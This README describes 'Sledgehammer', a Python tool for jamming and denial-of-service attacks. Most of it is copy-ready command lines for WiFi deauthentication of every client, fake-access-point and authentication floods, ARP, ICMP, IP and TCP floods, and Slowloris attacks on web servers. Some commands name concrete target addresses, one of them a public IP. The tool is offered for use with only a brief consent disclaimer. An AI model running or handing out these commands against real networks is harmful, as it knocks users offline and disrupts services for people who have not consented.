# <span style="color:red">Please note: This respository has become staled due to relocation to GitLab. Visit https://gitlab.com/mike01/ for up-to-date versions.</span>


### General information
Sledgehammer is collection of Jammer/DoS tools for various protocols. Those include at minimum:

- WiFi (smart deauthentication, DoS via fake AP creation, DoS via authentication)
- arp
- ip
- icmp
- tcp

### Requirements
- [Python 3.x](https://www.python.org/)
- [Pypacker](https://github.com/mike01/pypacker) ('pip install pypacker' or clone and 'python setup.py install')
- [iwconfig](http://www.hpl.hp.com/personal/Jean_Tourrilhes/Linux/Tools.html) (wireless-tools)

### Installation
Just download and execute.

### Usage examples
Get general help via: python sledgehammer.py --help
Depending on attack mode parameters can vary. See mode-parameters for more info.
Default source MAC and IP address is the one of the interface given by 'iface_name'.

- WiFI DoS via smart deauthentication: Disconnect all WiFi clients

  `python sledgehammer.py --mode wifi_deauth --iface_name wlan1 --count 9999`

- WiFI DoS via smart deauthentication: Disconnect all WiFi clients except '00:11:22:33:44:55'

  `python sledgehammer.py --mode wifi_deauth --iface_name wlan1 --nobroadcast --macs_excluded 00:11:22:33:44:55 --count 9999`

- WiFi DoS via mass fake APs

  `python sledgehammer.py --mode wifi_ap --iface_name wlan1 --channels 1 --count 9999`

- WiFi DoS via mass auth

  `python sledgehammer.py --mode wifi_auth --iface_name wlan1 --mac_dst 00:11:22:33:44:55:66 --channels 4 --count 9999`

- ARP

  `python sledgehammer.py --mode arp --iface_name wlan1 --mac_dst 00:11:22:33:44:55 --ip_dst 192.168.178.1`

- ICMP

  `python sledgehammer.py --mode icmp --iface_name wlan1 --mac_dst 00:11:22:33:44:55:66 --ip_dst 192.168.178.1`

- IP

  `python sledgehammer.py --mode ip --iface_name wlan0 --mac_dst 00:11:22:33:44:55:66 --ip_dst 192.168.178.123 --count 9999`

- TCP

  `python sledgehammer.py --mode tcp --iface_name wlan1 --mac_dst 00:11:22:33:44:55:66 --ip_dst 193.99.144.80 --port_dst 443`

- Slowlory

  `python sledgehammer.py -m slowlory --ip_dst 1.2.3.4 --port_dst 80  -i wlan0`

  `python sledgehammer.py -m slowlory --ip_dst www.domain.com --port_dst 443 --ssl True -i wlan0`

### Disclaimer
Use at your own risk. Do not use without full consent of everyone involved.
